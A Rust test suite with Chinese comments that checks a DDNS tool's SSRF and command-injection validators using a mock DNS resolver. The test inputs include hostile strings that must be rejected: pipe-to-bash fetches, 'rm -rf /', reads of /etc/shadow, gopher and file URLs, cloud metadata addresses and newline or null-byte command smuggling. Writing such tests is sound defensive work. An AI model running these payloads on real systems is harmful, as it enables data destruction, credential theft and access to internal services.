//! SSRF 与命令注入防护安全专项测试套件
//!
//! # 覆盖范围
//! 针对网络边界与外部进程调用的高危攻击面进行深度边界测试，
//! 确保 SSRF（服务端请求伪造、DNS 重绑定、云元数据越权）以及
//! Shell 命令注入（Unix/Windows 元字符逃逸、空字节截断、变量扩展）
//! 在系统边界得到确定性拦截与精准错误反馈。
//!
//! # 测试确定性设计 (P1-9)
//! 本套件**完全脱离真实公网 DNS**。所有涉及域名的用例均通过注入
//! [`MockResolver`] 断言校验逻辑本身，而非依赖外部网络状态。
//!
//! 此前 `valid_public_cases` 直接断言 `api.ipify.org` 等真实域名可访问，
//! 存在两类严重问题：
//! 1. **假性失败**：CI 网络受限、DNS 被墙、出口 IP 被限流时用例莫名失败；
//! 2. **反向失效**：若实现退化为「解析失败即放行」，公网放行用例反而会
//!    假性通过——安全测试比没有测试更危险。
//!
//! 注入 mock 解析器后，全部断言均可 100% 确定性复现：解析成功/失败/
//! 指向私网等分支由测试直接控制，与外部网络无关。

use rddns::ip_fetcher::command::validate_command_str;
use rddns::util::net::{HostResolver, validate_safe_host_with, validate_safe_url_endpoint_with};
use std::collections::HashMap;
use std::future::Future;
use std::net::IpAddr;
use std::pin::Pin;
use std::sync::Arc;

/// 测试用确定性域名解析器
///
/// # 设计原理
/// 以「域名 -> 预置结果」的映射表替代真实 DNS 查询。表��缺失的域名返回
/// 解析失败，可精确构造 fail-closed 分支而不依赖任何外部条件。
struct MockResolver {
    /// 域名到解析结果的映射；值为 `Err` 表示解析失败
    table: HashMap<String, Result<Vec<IpAddr>, String>>,
    /// 记录实际被查询的域名，用于断言解析确实发生
    queried: parking_lot::Mutex<Vec<String>>,
}

impl MockResolver {
    /// 构造解析器：入参为 `(域名, 解析结果)` 列表
    fn new(entries: Vec<(&str, Result<Vec<IpAddr>, &str>)>) -> Arc<Self> {
        let mut table = HashMap::new();
        for (host, result) in entries {
            table.insert(host.to_ascii_lowercase(), result.map_err(|e| e.to_string()));
        }
        Arc::new(Self {
            table,
            queried: parking_lot::Mutex::new(Vec::new()),
        })
    }

    /// 构造一个「全部解析失败」的解析器（模拟 DNS 不可用）
    fn always_fail() -> Arc<Self> {
        Arc::new(Self {
            table: HashMap::new(),
            queried: parking_lot::Mutex::new(Vec::new()),
        })
    }

    /// 查询记录
    fn queried_hosts(&self) -> Vec<String> {
        self.queried.lock().clone()
    }
}

impl HostResolver for MockResolver {
    fn resolve(
        &self,
        host: String,
        _port: u16,
    ) -> Pin<Box<dyn Future<Output = Result<Vec<IpAddr>, String>> + Send>> {
        self.queried.lock().push(host.clone());
        let result = self
            .table
            .get(&host.to_ascii_lowercase())
            .cloned()
            // 表中缺失的域名一律返回解析失败，用于验证 fail-closed
            .unwrap_or_else(|| Err("模拟解析失败：域名不在预置表中".to_string()));
        Box::pin(async move { result })
    }
}

#[tokio::test]
async fn test_ssrf_blocks_private_ipv4_without_dns() {
    // 私有 IPv4 目标在解析前即被字面量判定拦截，无需任何 DNS
    let private_ipv4_cases = [
        "http://127.0.0.1",
        "http://127.0.0.1:8080/metrics",
        "http://127.1",
        "http://10.0.0.1/admin",
        "http://10.255.255.255/api",
        "http://172.16.0.1/internal",
        "http://172.31.255.255/",
        "http://192.168.0.1/",
        "http://192.168.1.254:9876",
        "http://0.0.0.0",
        "http://0.0.0.0:8000",
    ];
    // 解析器恒失败：若实现错误地依赖解析结果，这些用例仍必须被拦截
    let resolver = MockResolver::always_fail();
    for url in private_ipv4_cases {
        let res = validate_safe_url_endpoint_with(url, resolver.as_ref()).await;
        assert!(
            res.is_err(),
            "SSRF 私有 IPv4 用例应当被严格拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }
    // 字面量 IP 不应触发 DNS 查询
    assert!(
        resolver.queried_hosts().is_empty(),
        "字面量 IP 判定不应触发任何 DNS 解析"
    );
}

#[tokio::test]
async fn test_ssrf_blocks_cloud_metadata_endpoints() {
    // 云厂商元数据与链路本地地址（AWS/GCP/阿里云 169.254.169.254）
    let cloud_metadata_cases = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254:80/computeMetadata/v1/",
        "http://169.254.1.1/internal",
        "http://169.254.254.254:8080/",
    ];
    let resolver = MockResolver::always_fail();
    for url in cloud_metadata_cases {
        let res = validate_safe_url_endpoint_with(url, resolver.as_ref()).await;
        assert!(
            res.is_err(),
            "SSRF 云元数据地址应当被严格拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }
}

#[tokio::test]
async fn test_ssrf_blocks_private_ipv6() {
    let ipv6_cases = [
        "http://[::1]",
        "http://[::1]:8080/status",
        "http://[fc00::1]/api",
        "http://[fd12:3456:789a::1]:8080",
        "http://[fe80::1]/link-local",
    ];
    let resolver = MockResolver::always_fail();
    for url in ipv6_cases {
        let res = validate_safe_url_endpoint_with(url, resolver.as_ref()).await;
        assert!(
            res.is_err(),
            "SSRF 本地与私有 IPv6 应当被严格拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }
}

#[tokio::test]
async fn test_ssrf_blocks_localhost_domains() {
    // 保留域名在解析前即被拦截，无需 DNS
    let localhost_cases = [
        "http://localhost",
        "http://localhost:3000",
        "http://api.localhost",
        "http://foo.bar.localhost/api",
    ];
    let resolver = MockResolver::always_fail();
    for url in localhost_cases {
        let res = validate_safe_url_endpoint_with(url, resolver.as_ref()).await;
        assert!(
            res.is_err(),
            "SSRF Localhost 域名应当被严格拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }
}

#[tokio::test]
async fn test_ssrf_blocks_userinfo_confusion() {
    // 带 UserInfo 混淆的私有地址：真实主机仍是内网 IP，必须被拦截
    let auth_confusion_cases = [
        "http://admin:pass@127.0.0.1:8080/",
        "http://attacker.com@127.0.0.1/",
        "http://root:secret@192.168.1.1/config",
    ];
    let resolver = MockResolver::always_fail();
    for url in auth_confusion_cases {
        let res = validate_safe_url_endpoint_with(url, resolver.as_ref()).await;
        assert!(
            res.is_err(),
            "带 UserInfo 混淆的私有地址应当被拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }
}

#[tokio::test]
async fn test_ssrf_blocks_illegal_schemes() {
    // 非 HTTP/HTTPS 协议在解析前即被拒绝
    let illegal_schemes = [
        "file:///etc/passwd",
        "file:///C:/Windows/win.ini",
        "ftp://127.0.0.1:21/test",
        "gopher://127.0.0.1:6379/_flushall",
        "dict://127.0.0.1:11211/stat",
        "javascript:alert(1)",
        "data:text/html,<html>test</html>",
    ];
    let resolver = MockResolver::always_fail();
    for url in illegal_schemes {
        let res = validate_safe_url_endpoint_with(url, resolver.as_ref()).await;
        assert!(
            res.is_err(),
            "非 HTTP/HTTPS 协议方案应当被严格拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }
}

/// 回归用例 (P1-9)：公网域名放行必须基于「解析成功且结果为公网 IP」
///
/// 此前该断言直接打真实公网，导致：解析失败时假性通过（若实现 fail-open）
/// 或网络受限时假性失败。现由 mock 精确控制解析结果，三种分支全部可复现。
#[tokio::test]
async fn test_ssrf_public_domain_allowance_is_deterministic() {
    // 1. 解析成功且指向公网 IP -> 放行
    let public_resolver = MockResolver::new(vec![
        ("api.ipify.org", Ok(vec!["93.184.216.34".parse().unwrap()])),
        ("icanhazip.com", Ok(vec!["104.26.0.1".parse().unwrap()])),
    ]);
    for url in [
        "https://api.ipify.org",
        "https://api.ipify.org:443",
        "http://icanhazip.com",
    ] {
        let res = validate_safe_url_endpoint_with(url, public_resolver.as_ref()).await;
        assert!(
            res.is_ok(),
            "解析到公网 IP 的域名应当放行: {}, 实际结果: {:?}",
            url,
            res
        );
    }
    // 确认确实发生过 DNS 解析（而非字面量绕过）
    assert!(
        !public_resolver.queried_hosts().is_empty(),
        "公网域名校验必须实际执行 DNS 解析"
    );

    // 2. 解析失败 -> 拒绝（fail-closed）。这是此前最危险的情形：
    //    若实现退化为「解析失败即放行」，公网放行用例会假性通过。
    let fail_resolver = MockResolver::always_fail();
    let res =
        validate_safe_url_endpoint_with("https://api.ipify.org", fail_resolver.as_ref()).await;
    assert!(
        res.is_err(),
        "DNS 解析失败必须 fail-closed 拒绝，绝不可放行"
    );
    assert!(
        fail_resolver
            .queried_hosts()
            .contains(&"api.ipify.org".to_string()),
        "解析失败路径必须确实尝试过解析（而非提前返回）"
    );

    // 3. 解析成功但指向私网 -> 拒绝（DNS 重绑定防御）
    let rebind_resolver = MockResolver::new(vec![
        ("evil.example.com", Ok(vec!["127.0.0.1".parse().unwrap()])),
        (
            "meta.example.com",
            Ok(vec!["169.254.169.254".parse().unwrap()]),
        ),
    ]);
    for url in [
        "https://evil.example.com/hook",
        "https://meta.example.com/latest",
    ] {
        let res = validate_safe_url_endpoint_with(url, rebind_resolver.as_ref()).await;
        assert!(
            res.is_err(),
            "解析结果指向私网/元数据地址时必须拒绝（DNS 重绑定防御）: {}",
            url
        );
    }
}

/// 回归用例 (P1-9)：字面量公网 IP 不应依赖 DNS
#[tokio::test]
async fn test_ssrf_literal_public_ip_needs_no_dns() {
    let resolver = MockResolver::always_fail();
    for url in ["https://1.1.1.1", "https://8.8.8.8/dns-query"] {
        let res = validate_safe_url_endpoint_with(url, resolver.as_ref()).await;
        assert!(
            res.is_ok(),
            "字面量公网 IP 应当直接放行且不依赖 DNS: {}",
            url
        );
    }
    assert!(
        resolver.queried_hosts().is_empty(),
        "字面量 IP 不应触发 DNS 解析"
    );
}

/// 回归用例 (P1-9)：`.invalid` 顶级域的拒绝行为不应依赖外部 DNS 行为
#[tokio::test]
async fn test_ssrf_unresolvable_domains_fail_closed() {
    // `.invalid` 是 RFC 2606 保留 TLD，恒不可解析。此处用 mock 显式模拟
    // 解析失败，断言 fail-closed 行为，不再依赖真实 DNS 的外部行为。
    let resolver = MockResolver::new(vec![
        (
            "non-existent-domain-404-ssrf-attack.invalid",
            Err("模拟解析失败"),
        ),
        ("dns-blackhole-test.invalid", Err("模拟解析失败")),
    ]);
    for url in [
        "http://non-existent-domain-404-ssrf-attack.invalid",
        "https://dns-blackhole-test.invalid:8443/status",
    ] {
        let res = validate_safe_url_endpoint_with(url, resolver.as_ref()).await;
        assert!(
            res.is_err(),
            "无法解析的域名应当默认拒绝 (fail-closed): {}",
            url
        );
    }
}

#[tokio::test]
async fn test_validate_safe_host_blocks_private_and_loopback() {
    let blocked_hosts = [
        "127.0.0.1",
        "192.168.1.1",
        "10.0.0.1",
        "172.16.0.1",
        "169.254.169.254",
        "::1",
        "fe80::1",
        "localhost",
        "test.local",
        "internal.service.arpa",
    ];

    let resolver = MockResolver::always_fail();
    for host in blocked_hosts {
        let res = validate_safe_host_with(host, Some(25), resolver.as_ref()).await;
        assert!(
            res.is_err(),
            "内网/保留地址应当被拦截: {}, 实际结果: {:?}",
            host,
            res
        );
    }

    // 公网 IP 字面量放行
    assert!(
        validate_safe_host_with("8.8.8.8", Some(53), resolver.as_ref())
            .await
            .is_ok()
    );
}

#[test]
fn test_command_injection_comprehensive_protection() {
    // 1. 管道与多命令分隔符注入
    let command_separators = [
        "curl http://example.com | bash",
        "echo 1.1.1.1 ; rm -rf /",
        "cat ip.txt & whoami",
        "ip route && rm -rf /",
        "ip route || calc.exe",
    ];
    for cmd in command_separators {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "管道与多命令拼接应当被严格拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 2. 输入输出重定向注入
    let redirects = [
        "cat < /etc/shadow",
        "echo 1.1.1.1 > /etc/resolv.conf",
        "ip addr >> /tmp/pwned",
    ];
    for cmd in redirects {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "重定向元字符应当被拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 3. 环境变量与参数扩展注入 (Unix $ 与 Windows %)
    let var_expansion = [
        "echo $PATH",
        "echo ${USER}",
        "echo %SYSTEMROOT%",
        "echo %TEMP%\\pwn.bat",
    ];
    for cmd in var_expansion {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "环境变量扩展元字符应当被拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 4. Windows 转义元字符与括号注入
    let windows_injection = [
        "dir^|whoami",
        "powershell^calc.exe",
        "powershell (Get-NetIPAddress)",
        "{whoami}",
        "curl http://1.1.1.1^(whoami^)",
    ];
    for cmd in windows_injection {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "Windows 转义元字符及括号应当被拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 5. 命令执行代换与反引号
    let subshell_cases = ["echo `id`", "cat `cat secret.txt`"];
    for cmd in subshell_cases {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "反引号命令代换应当被拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 6. 控制字符与空字节截断注入
    let control_char_cases = [
        "curl 1.1.1.1\nwhoami",
        "curl 1.1.1.1\rwhoami",
        "ip route\0--malicious",
    ];
    for cmd in control_char_cases {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "控制字符与空字节应当被拦截: {:?}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 7. 空命令与仅空白字符串
    assert!(validate_command_str("").is_err());
    assert!(validate_command_str("   ").is_err());
    assert!(validate_command_str("\t\r\n").is_err());

    // 8. 危险参数选项注入与 bash 历史扩展 (!) 拦截 (P-9)
    let option_injection_cases = [
        "curl --config=/etc/shadow https://api.ipify.org",
        "fetch_ip -o=/tmp/pwn",
        "-c whoami",
        "--help",
        "echo !123",
    ];
    for cmd in option_injection_cases {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "参数选项注入与感叹号应当被严格拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 9. 合法安全命令用例放行
    let valid_commands = [
        "curl -s -4 https://api.ipify.org",
        "ip -6 addr show eth0",
        "python get_ip.py --interface eth0",
        "C:\\tools\\my_ip_tool.exe --json",
        "/usr/local/bin/fetch-ip -v",
    ];
    for cmd in valid_commands {
        let res = validate_command_str(cmd);
        assert!(
            res.is_ok(),
            "合法独立命令应当被允许: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }
}
